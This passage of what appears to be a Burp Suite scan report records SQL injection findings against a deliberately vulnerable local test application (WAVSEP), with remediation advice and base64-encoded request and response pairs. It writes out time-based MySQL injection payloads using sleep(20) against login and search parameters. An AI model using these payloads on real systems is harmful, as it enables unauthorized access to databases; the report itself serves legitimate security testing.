<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>username</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the username parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the username parameter. The application took <b>20003</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkJnVzZXJuYW1lPXVzZXJuYW1lJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkxMQ0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0Njo1MSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7cGFzc3dvcmQmIzM5OyYjMzk7IGF0IGxpbmUgMTwvcD48cD48Yj5EZXNjcmlwdGlvbjwvYj4gVGhlIHNlcnZlciBlbmNvdW50ZXJlZCBhbiB1bmV4cGVjdGVkIGNvbmRpdGlvbiB0aGF0IHByZXZlbnRlZCBpdCBmcm9tIGZ1bGZpbGxpbmcgdGhlIHJlcXVlc3QuPC9wPjxociBjbGFzcz0ibGluZSIgLz48aDM+QXBhY2hlIFRvbWNhdC84LjUuODQ8L2gzPjwvYm9keT48L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkJnVzZXJuYW1lPXVzZXJuYW1lJyc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ2OjUxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgpsb2dpbiBmYWlsZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkJnVzZXJuYW1lPXVzZXJuYW1lJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYic=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ3OjEyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpoZWxsbyB1c2VyMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>632436830290975744</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case02-InjectionInSearch-String-UnionExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case02-InjectionInSearch-String-UnionExploit-WithErrors.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDItSW5qZWN0aW9uSW5TZWFyY2gtU3RyaW5nLVVuaW9uRXhwbG9pdC1XaXRoRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UwMi1JbmplY3Rpb25JblNlYXJjaC1TdHJpbmctVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0Jw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NjoxNiBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDItSW5qZWN0aW9uSW5TZWFyY2gtU3RyaW5nLVVuaW9uRXhwbG9pdC1XaXRoRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UwMi1JbmplY3Rpb25JblNlYXJjaC1TdHJpbmctVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0Jyc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ2OjE2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDItSW5qZWN0aW9uSW5TZWFyY2gtU3RyaW5nLVVuaW9uRXhwbG9pdC1XaXRoRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UwMi1JbmplY3Rpb25JblNlYXJjaC1TdHJpbmctVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0JyUyMGFuZCUyMChzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKS0tJTIw]]></request>
